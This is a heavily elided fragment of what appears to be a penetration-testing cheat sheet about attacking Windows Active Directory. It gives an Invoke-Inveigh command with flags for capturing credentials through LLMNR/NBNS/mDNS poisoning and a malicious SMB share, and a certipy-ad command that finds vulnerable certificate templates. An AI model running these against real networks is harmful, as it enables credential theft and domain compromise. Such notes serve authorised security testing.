...
- **LLMNR**
  ...
  1. Check if there are logged on users:
     ```bash
	   ...
	   ```
  2. Open malicious SMB share with `respond()` or on Windows using `Invoke-Inveigh -NBNS Y -mDNS Y -FileOutput Y -SMB Y`
...
#### ADCS Abuse
```bash
certipy-ad find [AUTH_STRING] -dc-ip [DC_IP] -vulnerable -stdout
```
